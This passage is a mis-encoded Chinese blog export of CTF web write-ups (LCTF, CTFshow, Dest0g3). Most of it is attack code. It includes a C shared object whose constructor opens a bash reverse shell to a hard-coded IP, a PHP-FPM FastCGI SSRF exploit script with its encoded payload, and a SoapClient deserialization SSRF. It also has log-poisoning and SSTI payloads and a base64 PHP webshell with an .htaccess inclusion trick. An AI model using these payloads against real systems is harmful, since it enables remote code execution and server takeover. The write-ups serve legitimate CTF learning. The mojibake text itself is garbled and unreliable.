æ³•ç›´æ¥SSRFï¼Œä½†æ˜¯å¯ä»¥åˆ©ç”¨`file_put_contents()`çš„ä¸€ä¸ªç‰¹æ€§æ¥å®ç°SSRFï¼š\n>\n> `file_put_contents`åœ¨ä½¿ç”¨ ftp åè®®æ—¶, ä¼šå°† data çš„å†…å®¹ä¸Šä¼ åˆ° ftp æœåŠ¡å™¨, ç”±äºä¸Šé¢è¯´çš„`pasv`æ¨¡å¼ä¸‹, æœåŠ¡å™¨çš„åœ°å€å’Œç«¯å£æ˜¯å¯æ§, æˆ‘ä»¬å¯ä»¥å°†åœ°å€å’Œç«¯å£æŒ‡åˆ°`127.0.0.1:9000`.åŒæ—¶ç”±äº ftp çš„ç‰¹æ€§,ä¸ä¼šæœ‰ä»»ä½•çš„å¤šä½™å†…å®¹, ç±»ä¼¼`gopher`åè®®, ä¼šå°†`data`åŸå°ä¸åŠ¨çš„å‘ç»™`127.0.0.1:9000`, å®Œç¾ç¬¦åˆæ”»å‡»fastcgi(FPM)çš„è¦æ±‚.\n\né¦–å…ˆç¼–å†™ä¸€ä¸ªæ¶æ„soæ–‡ä»¶\n\n```C\n#define _GNU_SOURCE\n#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\n\n__attribute__ ((__constructor__)) void preload (void){\n    system(\"bash -c 'exec bash -i &>/dev/tcp/45.15.131.101/6666 <&1'\");\n}\n```\n\nç„¶åè®©é¶æœºä¸‹è½½`var_dump(copy('http://45.15.131.101:5111/1.so','/var/www/html/1.so'));`\n\nä¸‹ä¸€æ­¥å°±æ˜¯å‡ºå‘SSRFæ”»å‡»FPMæŒ‚è½½soæ–‡ä»¶æ¥RCEï¼Œä¸‹é¢æ˜¯è„šæœ¬\n\n```php\n<?php\n/**\n * Note : Code is released under the GNU LGPL\n *\n * Please do not change the header of this file\n *\n * This library is free software; you can redistribute it and/or modify it under the terms of the GNU\n * Lesser General Public License as published by the Free Software Foundation; either version 2 of\n * the License, or (at your option) any later version.\n *\n * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;\n * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\n *\n * See the GNU Lesser General Public License for more details.\n */\n/**\n * Handles communication with a FastCGI application\n *\n * @author      Pierrick Charron <pierrick@webstart.fr>\n * @version     1.0\n */\nclass FCGIClient\n{\n    const VERSION_1            = 1;\n    const BEGIN_REQUEST        = 1;\n    const ABORT_REQUEST        = 2;\n    const END_REQUEST          = 3;\n    const PARAMS               = 4;\n    const STDIN                = 5;\n    const STDOUT               = 6;\n    const STDERR               = 7;\n    const DATA                 = 8;\n    const GET_VALUES           = 9;\n    const GET_VALUES_RESULT    = 10;\n    const UNKNOWN_TYPE         = 11;\n    const MAXTYPE              = self::UNKNOWN_TYPE;\n    const RESPONDER            = 1;\n    const AUTHORIZER           = 2;\n    const FILTER               = 3;\n    const REQUEST_COMPLETE     = 0;\n    const CANT_MPX_CONN        = 1;\n    const OVERLOADED           = 2;\n    const UNKNOWN_ROLE         = 3;\n    const MAX_CONNS            = 'MAX_CONNS';\n    const MAX_REQS             = 'MAX_REQS';\n    const MPXS_CONNS           = 'MPXS_CONNS';\n    const HEADER_LEN           = 8;\n    /**\n     * Socket\n     * @var Resource\n     */\n    private $_sock = null;\n    /**\n     * Host\n     * @var String\n     */\n    private $_host = null;\n    /**\n     * Port\n     * @var Integer\n     */\n    private $_port = null;\n    /**\n     * Keep Alive\n     * @var Boolean\n     */\n    private $_keepAlive = false;\n    /**\n     * Constructor\n     *\n     * @param String $host Host of the FastCGI application\n     * @param Integer $port Port of the FastCGI application\n     */\n    public function __construct($host, $port = 9001) // and default value for port, just for unixdomain socket\n    {\n        $this->_host = $host;\n        $this->_port = $port;\n    }\n    /**\n     * Define whether or not the FastCGI application should keep the connection\n     * alive at the end of a request\n     *\n     * @param Boolean $b true if the connection should stay alive, false otherwise\n     */\n    public function setKeepAlive($b)\n    {\n        $this->_keepAlive = (boolean)$b;\n        if (!$this->_keepAlive && $this->_sock) {\n            fclose($this->_sock);\n        }\n    }\n    /**\n     * Get the keep alive status\n     *\n     * @return Boolean true if the connection should stay alive, false otherwise\n     */\n    public function getKeepAlive()\n    {\n        return $this->_keepAlive;\n    }\n    /**\n     * Create a connection to the FastCGI application\n     */\n    private function connect()\n    {\n        if (!$this->_sock) {\n            //$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);\n            $this->_sock = stream_socket_client($this->_host, $errno, $errstr, 5);\n            if (!$this->_sock) {\n                throw new Exception('Unable to connect to FastCGI application');\n            }\n        }\n    }\n    /**\n     * Build a FastCGI packet\n     *\n     * @param Integer $type Type of the packet\n     * @param String $content Content of the packet\n     * @param Integer $requestId RequestId\n     */\n    private function buildPacket($type, $content, $requestId = 1)\n    {\n        $clen = strlen($content);\n        return chr(self::VERSION_1)         /* version */\n            . chr($type)                    /* type */\n            . chr(($requestId >> 8) & 0xFF) /* requestIdB1 */\n            . chr($requestId & 0xFF)        /* requestIdB0 */\n            . chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */\n            . chr($clen & 0xFF)             /* contentLengthB0 */\n            . chr(0)                        /* paddingLength */\n            . chr(0)                        /* reserved */\n            . $content;                     /* content */\n    }\n    /**\n     * Build an FastCGI Name value pair\n     *\n     * @param String $name Name\n     * @param String $value Value\n     * @return String FastCGI Name value pair\n     */\n    private function buildNvpair($name, $value)\n    {\n        $nlen = strlen($name);\n        $vlen = strlen($value);\n        if ($nlen < 128) {\n            /* nameLengthB0 */\n            $nvpair = chr($nlen);\n        } else {\n            /* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */\n            $nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);\n        }\n        if ($vlen < 128) {\n            /* valueLengthB0 */\n            $nvpair .= chr($vlen);\n        } else {\n            /* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */\n            $nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);\n        }\n        /* nameData & valueData */\n        return $nvpair . $name . $value;\n    }\n    /**\n     * Read a set of FastCGI Name value pairs\n     *\n     * @param String $data Data containing the set of FastCGI NVPair\n     * @return array of NVPair\n     */\n    private function readNvpair($data, $length = null)\n    {\n        $array = array();\n        if ($length === null) {\n            $length = strlen($data);\n        }\n        $p = 0;\n        while ($p != $length) {\n            $nlen = ord($data{$p++});\n            if ($nlen >= 128) {\n                $nlen = ($nlen & 0x7F << 24);\n                $nlen |= (ord($data{$p++}) << 16);\n                $nlen |= (ord($data{$p++}) << 8);\n                $nlen |= (ord($data{$p++}));\n            }\n            $vlen = ord($data{$p++});\n            if ($vlen >= 128) {\n                $vlen = ($nlen & 0x7F << 24);\n                $vlen |= (ord($data{$p++}) << 16);\n                $vlen |= (ord($data{$p++}) << 8);\n                $vlen |= (ord($data{$p++}));\n            }\n            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);\n            $p += ($nlen + $vlen);\n        }\n        return $array;\n    }\n    /**\n     * Decode a FastCGI Packet\n     *\n     * @param String $data String containing all the packet\n     * @return array\n     */\n    private function decodePacketHeader($data)\n    {\n        $ret = array();\n        $ret['version']       = ord($data{0});\n        $ret['type']          = ord($data{1});\n        $ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});\n        $ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});\n        $ret['paddingLength'] = ord($data{6});\n        $ret['reserved']      = ord($data{7});\n        return $ret;\n    }\n    /**\n     * Read a FastCGI Packet\n     *\n     * @return array\n     */\n    private function readPacket()\n    {\n        if ($packet = fread($this->_sock, self::HEADER_LEN)) {\n            $resp = $this->decodePacketHeader($packet);\n            $resp['content'] = '';\n            if ($resp['contentLength']) {\n                $len  = $resp['contentLength'];\n                while ($len && $buf=fread($this->_sock, $len)) {\n                    $len -= strlen($buf);\n                    $resp['content'] .= $buf;\n                }\n            }\n            if ($resp['paddingLength']) {\n                $buf=fread($this->_sock, $resp['paddingLength']);\n            }\n            return $resp;\n        } else {\n            return false;\n        }\n    }\n    /**\n     * Get Informations on the FastCGI application\n     *\n     * @param array $requestedInfo information to retrieve\n     * @return array\n     */\n    public function getValues(array $requestedInfo)\n    {\n        $this->connect();\n        $request = '';\n        foreach ($requestedInfo as $info) {\n            $request .= $this->buildNvpair($info, '');\n        }\n        fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));\n        $resp = $this->readPacket();\n        if ($resp['type'] == self::GET_VALUES_RESULT) {\n            return $this->readNvpair($resp['content'], $resp['length']);\n        } else {\n            throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');\n        }\n    }\n    /**\n     * Execute a request to the FastCGI application\n     *\n     * @param array $params Array of parameters\n     * @param String $stdin Content\n     * @return String\n     */\n    public function request(array $params, $stdin)\n    {\n        $response = '';\n//        $this->connect();\n        $request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));\n        $paramsRequest = '';\n        foreach ($params as $key => $value) {\n            $paramsRequest .= $this->buildNvpair($key, $value);\n        }\n        if ($paramsRequest) {\n            $request .= $this->buildPacket(self::PARAMS, $paramsRequest);\n        }\n        $request .= $this->buildPacket(self::PARAMS, '');\n        if ($stdin) {\n            $request .= $this->buildPacket(self::STDIN, $stdin);\n        }\n        $request .= $this->buildPacket(self::STDIN, '');\n        echo('?file=ftp://ip:9999/&data='.urlencode($request));\n//        fwrite($this->_sock, $request);\n//        do {\n//            $resp = $this->readPacket();\n//            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {\n//                $response .= $resp['content'];\n//            }\n//        } while ($resp && $resp['type'] != self::END_REQUEST);\n//        var_dump($resp);\n//        if (!is_array($resp)) {\n//            throw new Exception('Bad request');\n//        }\n//        switch (ord($resp['content']{4})) {\n//            case self::CANT_MPX_CONN:\n//                throw new Exception('This app can\\'t multiplex [CANT_MPX_CONN]');\n//                break;\n//            case self::OVERLOADED:\n//                throw new Exception('New request rejected; too busy [OVERLOADED]');\n//                break;\n//            case self::UNKNOWN_ROLE:\n//                throw new Exception('Role value not known [UNKNOWN_ROLE]');\n//                break;\n//            case self::REQUEST_COMPLETE:\n//                return $response;\n//        }\n    }\n}\n?>\n<?php\n// real exploit start here\n//if (!isset($_REQUEST['cmd'])) {\n//    die(\"Check your input\\n\");\n//}\n//if (!isset($_REQUEST['filepath'])) {\n//    $filepath = __FILE__;\n//}else{\n//    $filepath = $_REQUEST['filepath'];\n//}\n\n$filepath = \"/var/www/html/add_api.php\";\n$req = '/'.basename($filepath);\n$uri = $req .'?'.'command=whoami';\n$client = new FCGIClient(\"unix:///var/run/php-fpm.sock\", -1);\n$code = \"<?php system(\\$_REQUEST['command']); phpinfo(); ?>\"; \n$php_value = \"unserialize_callback_func = system\\nextension_dir = /var/www/html\\nextension = 1.so\\ndisable_classes = \\ndisable_functions = \\nallow_url_include = On\\nopen_basedir = /\\nauto_prepend_file = \";   //æ³¨æ„ä¿®æ”¹è¿™é‡Œçš„soæ–‡ä»¶åç§°å’Œè·¯å¾„\n$params = array(\n    'GATEWAY_INTERFACE' => 'FastCGI/1.0',\n    'REQUEST_METHOD'    => 'POST',\n    'SCRIPT_FILENAME'   => $filepath,\n    'SCRIPT_NAME'       => $req,\n    'QUERY_STRING'      => 'command=whoami',\n    'REQUEST_URI'       => $uri,\n    'DOCUMENT_URI'      => $req,\n#'DOCUMENT_ROOT'     => '/',\n    'PHP_VALUE'         => $php_value,\n    'SERVER_SOFTWARE'   => '80sec/wofeiwo',\n    'REMOTE_ADDR'       => '127.0.0.1',\n    'REMOTE_PORT'       => '9001',    // æ³¨æ„è¿™é‡Œçš„FPMç«¯å£\n    'SERVER_ADDR'       => '127.0.0.1',\n    'SERVER_PORT'       => '80',\n    'SERVER_NAME'       => 'localhost',\n    'SERVER_PROTOCOL'   => 'HTTP/1.1',\n    'CONTENT_LENGTH'    => strlen($code)\n);\n// print_r($_REQUEST);\n// print_r($params);\n//echo \"Call: $uri\\n\\n\";\necho $client->request($params, $code).\"\\n\";\n?>\n```\n\nç”Ÿæˆpayloadåè®¿é—®\n\n```\nhack.php?file=ftp://45.15.131.101:9999/&data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3F%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B3PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00\n```\n\nåå¼¹shellæˆåŠŸï¼Œææƒï¼ŒæŸ¥çœ‹æœ‰suidçš„å‘½ä»¤\n\n```shell\nfind / -perm -u=s -type f 2>/dev/null\n/bin/mount\n/bin/su\n/bin/umount\n/usr/bin/chfn\n/usr/bin/chsh\n/usr/bin/gpasswd\n/usr/bin/newgrp\n/usr/bin/passwd\n/usr/local/bin/php\n```\n\nç”¨phpå‘½ä»¤è¡Œæ¨¡å¼ï¼ŒåŒæ ·å…ˆç»•è¿‡open_basedirï¼Œå†readfileè¯»å–flagå³å¯\n\n## bestphp's revenge\n\nä¸Šæ¥å°±æ˜¯ä¸€ä¸ªæºç \n\n```php\n<?php\nhighlight_file(__FILE__);\n$b = 'implode';\ncall_user_func($_GET['f'], $_POST);\nsession_start();\nif (isset($_GET['name'])) {\n    $_SESSION['name'] = $_GET['name'];\n}\nvar_dump($_SESSION);\n$a = array(reset($_SESSION), 'welcome_to_the_lctf2018');\ncall_user_func($b, $a);//æ­¤å¤„å¦‚æœä¸æ›´æ”¹$bé‚£ä¹ˆå°±ä¼šç›´æ¥å°†$aåˆå¹¶ä¸ºå­—ç¬¦ä¸²ç„¶åè¿”å›\n?>\n//è¿˜æœ‰ä¸€ä¸ªflag.php\nsession_start();\necho 'only localhost can get flag!';\n$flag = 'LCTF{*************************}';\nif($_SERVER[\"REMOTE_ADDR\"]===\"127.0.0.1\"){\n       $_SESSION['flag'] = $flag;\n   }\nonly localhost can get flag!\n```\n\næ˜æ˜¾æ˜¯SSRFäº†ï¼Œ[[HFCTF2020]BabyUpload](https://jlan.darkflow.top/posts/210d3ac7.html#HFCTF2020-BabyUpload)è¿™é‡Œæœ‰phpçš„sessionå­˜å‚¨å¼•æ“ç›¸å…³å†…å®¹ï¼Œphpä¸­é»˜è®¤ä½¿ç”¨çš„æ˜¯PHPå¼•æ“ï¼Œä¿®æ”¹å¼•æ“ä½¿ç”¨`ini_set('session.serialize_handler', 'éœ€è¦è®¾ç½®çš„å¼•æ“');`å³å¯ä¿®æ”¹ï¼Œæ­¤å¤„æˆ‘ä»¬é€šè¿‡ä¸åŒçš„sessionå­˜å‚¨è¯»å–æ–¹æ³•å³å¯å¯¼è‡´ååºåˆ—åŒ–ï¼Œè€ŒSSRFåªéœ€è¦é€šè¿‡åŸç”Ÿç±»ä¸­çš„`SoapClient`ç±»ååºåˆ—åŒ–æ‰§è¡Œ`__call`æ–¹æ³•å°±è¡Œ\n\né¦–å…ˆæ„é€ `SoapClient`ç±»\n\n```php\n<?php\n$url = \"http://127.0.0.1/flag.php\";\n$b = new SoapClient(null, array('uri' => $url, 'location' => $url));\n$a = serialize($b);\n$a = str_replace('^^', \"\\r\\n\", $a);\necho \"|\" . urlencode($a);\n?>\n```\n\nç„¶åä¸Šä¼ ï¼Œä½¿å¾—ååºåˆ—åŒ–è¢«æ‰§è¡Œ\n\n```\n/?f=session_start&name=|O%3A10%3A%22SoapClient%22%3A3%3A%7Bs%3A3%3A%22uri%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D\nserialize_handler=php_serialize\n```\n\nè°ƒç”¨ç±»ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•è§¦å‘`__call`\n\n```\n/?f=extract&name=SoapClient\nb=call_user_func\n```\n\nvar_dumpæŸ¥çœ‹SESSIONIDï¼Œæœ€ç»ˆæ”¹Cookieæ‹¿flag\n\n"},{"title":"CTFshowé»‘ç›’æµ‹è¯•","url":"/posts/c8094d2d.html","content":"\n**380**\n\næ‰«ç›®å½•æ‰«é™¤page.phpæ–‡ä»¶\n\næ‰“å¼€æç¤ºæ–‡ä»¶ä¸å­˜åœ¨ï¼Œä¼ å‚åŒ…å«flag.php\n\n**381**\n\n```\næ‰“å¼€page_$id.phpå¤±è´¥\n```\n\nè¿™æ¬¡å˜äº†ï¼Œç›®å½•ç©¿è¶Šèƒ½æ‹¿åˆ°æºç ï¼Œä½†æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œå›é¦–é¡µå‘ç°cssæ–‡ä»¶è·¯å¾„å¾ˆå¥‡æ€ªï¼Œè®¿é—®å¾—åˆ°flag\n\n**382**\n\nåŒä¸Šé¢˜ç›®å½•ï¼Œä¸è¿‡éœ€è¦ç™»å½•ï¼Œä¸‡èƒ½å¯†ç å³å¯\n\n**383**\n\nåŒä¸Š\n\n**384**\n\næç¤ºï¼š`å¯†ç å‰2ä½æ˜¯å°å†™å­—æ¯ï¼Œåä¸‰ä½æ˜¯æ•°å­—`\n\nçˆ†ç ´å’¯ï¼Œç»“æœæ˜¯xy123\n\n"},{"title":"Dest0g3 520è¿æ–°èµ›","url":"/posts/41a3f068.html","content":"\n## phpdest\n\nåŒ…å«logæ–‡ä»¶æ”¹User-Agent\n\n```\npayload:\n?file=/var/log/nginx/access.log\n\nUser-Agent: <?php var_dump($flag);?>\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011423203.png)\n\n\n\n## EasyPHP\n\n```php\n<?php\nhighlight_file(__FILE__);\ninclude \"fl4g.php\";\n$dest0g3 = $_POST['ctf'];\n$time = date(\"H\");\n$timme = date(\"d\");\n$timmme = date(\"i\");\nif(($time > \"24\") or ($timme > \"31\") or ($timmme > \"60\")){\n    echo $fl4g;\n}else{\n    echo \"Try harder!\";\n}\nset_error_handler(\n    function() use(&$fl4g) {\n        print $fl4g;\n    }\n);\n$fl4g .= $dest0g3;\n?>\n```\n\ntimeæ¡ä»¶æ˜¯ä¸å¯èƒ½æ»¡è¶³äº†ï¼Œçœ‹ä¸‹é¢çš„è‡ªå®šä¹‰é”™è¯¯å‡½æ•°ï¼Œåªéœ€è¦è®©ç¨‹åºäº§ç”Ÿé”™è¯¯å°±è¡Œï¼Œ.è¿ç®—ç”¨äºæ‹¼æ¥å­—ç¬¦ä¸²ï¼Œä¼ å…¥æ•°ç»„å³å¯\n\n```\npayload:\nPOST\nctf[]=1\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011423502.png)\n\n## SimpleRCE\n\nglobåè®®å¾—åˆ°æ–‡ä»¶åï¼Œå†ä½¿ç”¨fopenæ‰“å¼€æ–‡ä»¶ï¼Œfreadè¯»å–å†…å®¹\n\n```\npayload:\nPOST\naaa=echo(fread(fopen(end(glob('/f*')),'r'),100));\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011423683.png)\n\n## EasySSTI\n\nå…ˆç»™ä¸ªä¸€æ¬¡æ€§payload\n\n```\nusername={%25set%0dpoint=config|string|truncate(4)|last%25}\n{%25set%0dcxhx=config|join|truncate(28)|replace(point,wu)|last%25}\n{%25set%0dca=config|join|truncate(23)|replace(point,wu)|last|lower%25}\n{%25set%0dcb=config|join|truncate(9)|replace(point,wu)|last|lower%25}\n{%25set%0dcc=config|join|truncate(31)|replace(point,wu)|last|lower%25}\n{%25set%0dcd=config|join|truncate(7)|replace(point,wu)|last|lower%25}\n{%25set%0dce=config|join|truncate(4)|replace(point,wu)|last|lower%25}\n{%25set%0dcf=config|join|truncate(98)|replace(point,wu)|last|lower%25}\n{%25set%0dcg=config|join|truncate(11)|replace(point,wu)|last|lower%25}\n{%25set%0dch=config|join|truncate(203)|replace(point,wu)|last|lower%25}\n{%25set%0dci=config|join|truncate(16)|replace(point,wu)|last|lower%25}\n{%25set%0dcj=config|join|truncate(429)|replace(point,wu)|last|lower%25}\n{%25set%0dck=config|join|truncate(75)|replace(point,wu)|last|lower%25}\n{%25set%0dcl=config|join|truncate(96)|replace(point,wu)|last|lower%25}\n{%25set%0dcm=config|join|truncate(81)|replace(point,wu)|last|lower%25}\n{%25set%0dcn=config|join|truncate(5)|replace(point,wu)|last|lower%25}\n{%25set%0dco=config|join|truncate(21)|replace(point,wu)|last|lower%25}\n{%25set%0dcp=config|join|truncate(19)|replace(point,wu)|last|lower%25}\n{%25set%0dcq=config|join|truncate(294)|replace(point,wu)|last|lower%25}\n{%25set%0dcr=config|join|truncate(20)|replace(point,wu)|last|lower%25}\n{%25set%0dcs=config|join|truncate(14)|replace(point,wu)|last|lower%25}\n{%25set%0dct=config|join|truncate(12)|replace(point,wu)|last|lower%25}\n{%25set%0dcu=config|join|truncate(10)|replace(point,wu)|last|lower%25}\n{%25set%0dcv=config|join|truncate(6)|replace(point,wu)|last|lower%25}\n{%25set%0dcx=config|join|truncate(30)|replace(point,wu)|last|lower%25}\n{%25set%0dcy=config|join|truncate(77)|replace(point,wu)|last|lower%25}\n{%25set%0dcz=config|join|truncate(533)|replace(point,wu)|last|lower%25}\n{%25set%0dglo=cxhx%2Bcxhx%2Bcg%2Bcl%2Bco%2Bcb%2Bca%2Bcl%2Bcs%2Bcxhx%2Bcxhx%25}\n{%25set%0dcla=cxhx%2Bcxhx%2Bcc%2Bcl%2Bca%2Bcs%2Bcs%2Bcxhx%2Bcxhx%25}\n{%25set%0dooo=lipsum|attr(glo)|attr(cp%2Bco%2Bcp)(co%2Bcs)%25}\n{%25set%0da1=config|string|truncate(300)|replace(point,wu)|list%25}\n{{a1|attr(cp%2Bco%2Bcp)()}}\n{{a1|attr(cp%2Bco%2Bcp)()}}\n{%25set%0dgang=a1|attr(cp%2Bco%2Bcp)()%25}\n{%25set%0da2=config|list|string|truncate(20)|replace(point,wu)|list%25}\n{{a2|attr(cp%2Bco%2Bcp)()}}\n{{a2|attr(cp%2Bco%2Bcp)()}}\n{{a2|attr(cp%2Bco%2Bcp)()}}\n{{a2|attr(cp%2Bco%2Bcp)()}}\n{{a2|attr(cp%2Bco%2Bcp)()}}\n{{a2|attr(cp%2Bco%2Bcp)()}}\n{{a2|attr(cp%2Bco%2Bcp)()}}\n{{a2|attr(cp%2Bco%2Bcp)()}}\n{%25set%0dspace=a2|attr(cp%2Bco%2Bcp)()%25}\n{{ooo|attr(cp%2Bco%2Bcp%2Bce%2Bcn)(cc%2Bca%2Bct%2Bspace%2Bgang%2Bcf%2Bcl%2Bca%2Bcg)|attr(cr%2Bce%2Bca%2Bcd)()}}\n```\n\nbançš„çœŸå¤š////////////\n\nä¸€ä¸ªè·å–æ‰€æœ‰å­—æ¯çš„å°è„šæœ¬\n\n```python\nstr=\"ENVDEBUGTESTINGPROPAGATE_EXCEPTIONSPRESERVE_CONTEXT_ON_EXCEPTIONSECRET_KEYPERMANENT_SESSION_LIFETIMEUSE_X_SENDFILESERVER_NAMEAPPLICATION_ROOTSESSION_COOKIE_NAMESESSION_COOKIE_DOMAINSESSION_COOKIE_PATHSESSION_COOKIE_HTTPONLYSESSION_COOKIE_SECURESESSION_COOKIE_SAMESITESESSION_REFRESH_EACH_REQUESTMAX_CONTENT_LENGTHSEND_FILE_MAX_AGE_DEFAULTTRAP_BAD_REQUEST_ERRORSTRAP_HTTP_EXCEPTIONSEXPLAIN_TEMPLATE_LOADINGPREFERRED_URL_SCHEMEJSON_AS_ASCIIJSON_SORT_KEYSJSONIFY_PRETTYPRINT_REGULARJSONIFY_MIMETYPETEMPLATES_AUTO_RELOADMAX_COOKIE_SIZE\"\nfor i in \"abcdefghijklmnopqrstuvwxyz\":\n    kkk=0\n    for j in str:\n        if i==j.lower():\n            print(j)\n            ini=str.find(j)+4\n            print(f\"å­—ç¬¦{i}ï¼šset%0dc{i}=config|join|truncate({ini})|replace(point,wu)|last|lower\")\n            break\n```\n\nä½¿ç”¨åšå‡ºçš„å­—ç¬¦å˜é‡æ‹¼æ¥ä½¿ç”¨ï¼Œåå¤ä½¿ç”¨popç›´åˆ°æ‹¿åˆ°è‡ªå·±æƒ³è¦çš„å­—ç¬¦ï¼Œæœ€åå°†osæ¨¡å—popå‡ºè¿›è¡Œä½¿ç”¨ï¼ˆè¿™ä¹Ÿå¯¼è‡´äº†è¿™ä¸ªpayloadåªèƒ½ä¸€æ¬¡æ€§ä½¿ç”¨ï¼Œä½¿ç”¨ä¸€æ¬¡ç ´åä¸€æ¬¡ç¯å¢ƒï¼‰\n\n## funny_upload\n\n.htaccessè§£ææ¼æ´\n\nå…ˆæ„é€ htaccessæ–‡ä»¶å†…å®¹\n\n```\nAddType application/x-httpd-php .png\n```\n\nä¸Šä¼ å›¾ç‰‡å‘ç°ç¡®å®è¢«ä»¥phpæ–‡ä»¶è§£æäº†ï¼Œè€Œåå°è¯•æ„é€ å›¾ç‰‡é©¬ï¼Œæœ€ç»ˆå‘ç°`<?`è¢«è¿‡æ»¤ï¼Œå°è¯•å„ç§æ ‡ç­¾ï¼ˆphp7ä¸æ”¯æŒï¼‰ç»•è¿‡æ— æœï¼Œ00%æˆªæ–­æ— æœï¼ŒæŸ¥è¯¢å¾—çŸ¥htaccessä¹Ÿæœ‰ç±»ä¼¼.user.iniçš„æ–‡ä»¶åŒ…å«åŠŸèƒ½`php_value auto_append_file  \"æ–‡ä»¶å\"`ç›¸å½“äºæ‰§è¡Œ`include(\"æ–‡ä»¶å\")`æ­¤å¤„å¯ä½¿ç”¨PHPè¿‡æ»¤å™¨ï¼Œæ‰€ä»¥å¯ä»¥å…ˆæ„é€ aæ–‡ä»¶åŒ…å«base64ç¼–ç åçš„æœ¨é©¬ï¼Œè€Œåå†ä½¿ç”¨è¿‡æ»¤å™¨è§£ç åŒ…å«æ‰§è¡Œ\n\n```\n//1.png\nPD9waHAgZXZhbCgkX1BPU1RbJ2trayddKTs/Pg==\n//.htaccess\nAddType application/x-httpd-php .png\nphp_value auto_append_file \"php://filter/convert.base64-decode/resource=1.png\"\n```\n\næ­¤æ—¶å†ä¸Šä¼ ä»»æ„pngå¹¶è®¿é—®å³å¯æ‰§è¡Œå›¾ç‰‡é©¬ï¼ˆå±…ç„¶è¿˜banç³»ç»Ÿå‘½ä»¤æ‰§è¡Œï¼‰\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011424854.png)\n\n**åé¢å°±æ˜¯è·Ÿç€å„ä½å¤§ä½¬WPåšå‡ºæ¥å¹¶ä¸”å­¦ä¹ åˆ°çš„æ–°çŸ¥è¯†å•¦**\n\n## PharPOP\n\nè¿›å»ä¹‹åé¦–å…ˆå‘ç°ä¼ ä¸è¿›å»ä¸œè¥¿ï¼Œç”±äºErrorçš„å­˜åœ¨ç›´æ¥ä¼ å…¥æ— æ³•è°ƒç”¨`__destruct`æ–¹æ³•ä¹Ÿå°±ä¸èƒ½ä¸Šä¼ æ–‡ä»¶ï¼Œçœ‹äº†å¤§ä½¬wpå‘ç°æ˜¯é€šè¿‡æ„é€ å’Œååºåˆ—åŒ–å­—ç¬¦ä¸²ä¸ç›¸ç­‰çš„å˜é‡å£°æ˜æ•°é‡æ¥å¯¼è‡´ååºåˆ—åŒ–è¿‡ç¨‹æŠ¥é”™ï¼Œä½¿å¾—å†…å®¹è¢«é”€æ¯æ‰§è¡Œ`__destruct`æ–¹æ³•\n\nä¸‹ä¸€æ­¥å°±æ˜¯æ„é€ ååºåˆ—åŒ–é“¾äº†ï¼Œæœ€ç»ˆåˆ©ç”¨åˆ°çš„æ˜¯airä¸­çš„`__set`æ–¹æ³•åˆ©ç”¨PHPåŸç”Ÿç±»è¯»æ–‡ä»¶\n\n> è¦è§¦å‘airç±»çš„`__set`é­”æœ¯æ–¹æ³•ï¼Œéœ€è¦ç»™ä¸å¯è®¿é—®å±æ€§èµ‹å€¼ï¼Œappleç±»ä¸­`__get`æœ‰èµ‹å€¼ ï¼Œè§¦å‘`__get`éœ€è¦è¯»å–ä¸å¯è®¿é—®å±æ€§çš„å€¼ï¼Œéœ€è¦è§¦å‘treeä¸­`__call`ï¼Œ`__call`æ˜¯è¦è°ƒç”¨å†…éƒ¨ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œtreeä¸­`__destruct`æ–¹æ³•å†…return $this->name();ã€‚\n>\n> 